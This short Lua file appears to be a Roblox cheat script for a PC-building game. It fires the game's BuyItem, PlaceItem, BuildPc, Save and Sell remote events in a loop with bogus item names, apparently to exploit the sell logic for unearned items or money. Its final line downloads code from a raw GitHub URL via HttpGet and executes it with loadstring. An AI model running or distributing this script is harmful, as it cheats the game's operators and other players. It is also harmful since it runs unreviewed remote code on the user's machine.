function execute()
 game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.BuyItem:FireServer("Plain Case", false, "1")
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.PlaceItem:FireServer("Plain Case")
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.BuildPc:FireServer("finish editing component")
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Save:FireServer("pp")
   for i = 1, 10 do
       game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Sell:FireServer("error")
       game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Sell:FireServer("error"..i)
   end
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Sell:FireServer("pp")
end

loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/R.Key")()
